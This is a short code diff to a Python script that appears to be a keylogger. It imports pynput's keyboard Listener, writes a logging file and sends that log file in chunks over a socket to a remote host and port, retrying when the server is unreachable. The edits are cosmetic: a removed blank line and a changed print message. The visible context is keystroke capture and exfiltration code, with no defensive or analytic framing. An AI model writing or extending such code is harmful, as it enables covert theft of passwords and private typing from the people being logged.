@@ -6,7 +6,6 @@ from pynput.keyboard import Key, Listener
 def get_os():
     return platform.system()
 
-
 # Function to configure the logging file
 def setup_logging_file(filename):
     logging.basicConfig(
@@ -45,7 +44,7 @@ def send_log_file(filename, host, port, last_position):
                     sock.send(file_data)
                     file_data = file.read(1024)
                 last_position = file.tell()
-        print(f"Log file sent")
+        print(f"\nLog file sent")
         return last_position
     except socket.error:
         print('Server unreachable ! The log file will be sent later')
